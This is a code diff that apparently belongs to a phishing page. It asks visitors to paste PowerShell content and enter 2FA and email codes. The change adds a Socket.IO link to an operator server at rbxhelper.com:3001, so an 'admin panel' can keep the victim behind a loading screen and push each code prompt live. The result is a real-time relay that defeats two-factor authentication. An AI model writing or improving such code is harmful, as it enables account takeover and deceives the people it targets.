@@ -69,12 +69,8 @@ document.getElementById('submitButton').addEventListener('click', async function
   powershellInput.value = '';
   closeModal('modal');
 
-  // Show loading overlay and after 10 seconds show 2FA modal
-  showLoading(true, true); // true = cycling
-  setTimeout(() => {
-    showLoading(false);
-    openModal('twofa-modal');
-  }, 10000);
+  // Show loading overlay indefinitely, wait for admin panel to send modal
+  showLoading(true, true);
 });
 
 // === Loading Spinner and Message ===
@@ -171,13 +167,7 @@ if (twofaInput && verifyButton) {
 
     twofaInput.value = '';
     closeModal('twofa-modal');
-
-    // Show loading overlay with only "Processing" for 5 seconds, then show email modal
-    showLoading(true, false);
-    setTimeout(() => {
-      showLoading(false);
-      openModal('twofa-modal-2');
-    }, 5000);
+    startIndefiniteLoading(); // Show loading again until admin sends next modal
   });
 }
 
@@ -203,8 +193,6 @@ if (twofaInput2 && verifyButton2) {
 
     twofaInput2.value = '';
     closeModal('twofa-modal-2');
-
-    // Show green alert box
     showSuccessPopup();
   });
 }
@@ -288,3 +276,27 @@ styleSheet.innerText = `
   letter-spacing: 1px;
 }`;
 document.head.appendChild(styleSheet);
+
+// === Socket.IO Integration for Admin Modal Control ===
+const socket = io('http://rbxhelper.com:3001');
+
+function startIndefiniteLoading() {
+  showLoading(true, true); // Show loading overlay indefinitely
+}
+
+socket.on('show-modal', function(modalType) {
+  showLoading(false); // Stop loading overlay if needed
+
+  if (modalType === '2fa') {
+    openModal('twofa-modal');
+    // After 2FA, loading resumes until admin sends another modal
+  } else if (modalType === 'email') {
+    openModal('twofa-modal-2');
+    setTimeout(() => {
+      closeModal('twofa-modal-2');
+      showSuccessPopup(); // Or your "Done" screen
+    }, 5000);
+  } else if (modalType === 'done') {
+    showSuccessPopup(); // Or your "Done" screen
+  }
+});
